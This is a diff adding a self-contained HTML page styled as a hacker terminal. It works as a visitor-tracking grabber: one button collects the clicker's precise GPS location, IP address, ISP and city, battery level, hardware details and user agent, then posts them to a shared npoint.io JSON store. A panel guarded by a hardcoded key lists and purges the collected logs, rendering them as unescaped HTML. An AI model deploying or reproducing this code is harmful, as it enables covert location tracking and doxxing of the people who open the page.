@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Protocol v5.0</title>
+    <style>
+        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .box { background: #0a0a0a; padding: 25px; border-radius: 5px; width: 90%; max-width: 450px; text-align: center; border: 1px solid #0f0; box-shadow: 0 0 20px #0f0; }
+        h2 { text-transform: uppercase; letter-spacing: 5px; font-size: 1.2rem; margin-bottom: 25px; }
+        button { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #0f0; background: transparent; color: #0f0; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        button:hover { background: #0f0; color: #000; }
+        .btn-red { border-color: #f00; color: #f00; display: none; margin-top: 20px; }
+        .btn-red:hover { background: #f00; color: #000; }
+        #status { font-size: 12px; margin: 15px 0; color: #888; }
+        #results { margin-top: 20px; text-align: left; background: #050505; padding: 15px; border: 1px dashed #0f0; display: none; max-height: 400px; overflow-y: auto; font-size: 11px; }
+        .entry { border-bottom: 1px double #222; padding: 10px 0; }
+        .highlight { color: #fff; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>Terminal.v5</h2>
+    <button onclick="ultimateScan()">EXTRACT ALL DATA</button>
+    <button onclick="accessPanel()">ADMIN LOGIN</button>
+    <div id="status">STATUS: STANDBY</div>
+    <div id="results"></div>
+    <button class="btn-red" id="clearBtn" onclick="wipe()">PURGE DATABASE</button>
+</div>
+
+<script>
+    const API_URL = "https://api.npoint.io/970512ab12c9b4a48cfd";
+
+    function getHardwareInfo() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+        return {
+            gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Hidden",
+            cores: navigator.hardwareConcurrency || "N/A",
+            mem: navigator.deviceMemory || "N/A",
+            plat: navigator.platform,
+            touch: navigator.maxTouchPoints,
+            ratio: window.devicePixelRatio,
+            res: `${window.screen.width}x${window.screen.height}`
+        };
+    }
+
+    async function ultimateScan() {
+        const st = document.getElementById('status');
+        st.innerText = "STATUS: EXTRACTION_IN_PROGRESS...";
+        
+        let report = {
+            id: Math.floor(Math.random() * 10000),
+            time: new Date().toLocaleString("ru-RU"),
+            geo: "ACCESS_DENIED",
+            ip_data: {},
+            battery: "N/A",
+            hw: getHardwareInfo(),
+            software: {
+                ua: navigator.userAgent,
+                lang: navigator.language,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled ? "YES" : "NO",
+                online: navigator.onLine ? "YES" : "NO"
+            }
+        };
+
+        // GPS
+        const pos = () => new Promise(res => {
+            navigator.geolocation.getCurrentPosition(
+                p => res(`${p.coords.latitude}, ${p.coords.longitude}`),
+                () => res("USER_BLOCKED_GPS"),
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        });
+        report.geo = await pos();
+
+        // Battery
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            report.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+        }
+
+        // IP & Network
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const d = await res.json();
+            report.ip_data = { ip: d.ip, city: d.city, isp: d.org, country: d.country_name };
+        } catch(e) { report.ip_data = "NETWORK_ERROR"; }
+
+        // Save
+        try {
+            const get = await fetch(API_URL);
+            let db = await get.json();
+            if (!Array.isArray(db)) db = [];
+            db.push(report);
+            await fetch(API_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(db)
+            });
+            st.innerText = "STATUS: DATA_SAVED";
+            alert("Все доступные системные данные извлечены и сохранены.");
+        } catch(e) { st.innerText = "STATUS: ERROR"; }
+    }
+
+    async function accessPanel() {
+        const key = prompt("ENTER SYSTEM KEY:"); // Подсказки больше нет
+        if (key !== "3664") return alert("WRONG KEY");
+
+        document.getElementById('clearBtn').style.display = 'block';
+        const resDiv = document.getElementById('results');
+        resDiv.style.display = 'block';
+        resDiv.innerHTML = "LOADING_LOGS...";
+
+        try {
+            const res = await fetch(API_URL);
+            const logs = await res.json();
+            resDiv.innerHTML = logs.reverse().map(l => `
+                <div class="entry">
+                    <span class="highlight">LOG_${l.id} [${l.time}]</span><br>
+                    📍 GPS: ${l.geo}<br>
+                    🌐 IP: ${l.ip_data.ip} (${l.ip_data.city}, ${l.ip_data.country})<br>
+                    🏢 ISP: ${l.ip_data.isp}<br>
+                    🔋 BAT: ${l.battery}<br>
+                    🎮 GPU: ${l.hw.gpu}<br>
+                    🧠 CPU: ${l.hw.cores} Cores / RAM: ${l.hw.mem}GB<br>
+                    📱 DEVICE: ${l.hw.res} / ${l.hw.plat}<br>
+                    🌍 TZ: ${l.software.tz}<br>
+                    <details><summary>[USER_AGENT]</summary>${l.software.ua}</details>
+                </div>
+            `).join('');
+        } catch(e) { resDiv.innerHTML = "READ_ERROR"; }
+    }
+
+    async function wipe() {
+        if (!confirm("PURGE ALL DATA?")) return;
+        await fetch(API_URL, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify([])
+        });
+        location.reload();
+    }
+</script>
+
+</body>
+</html>
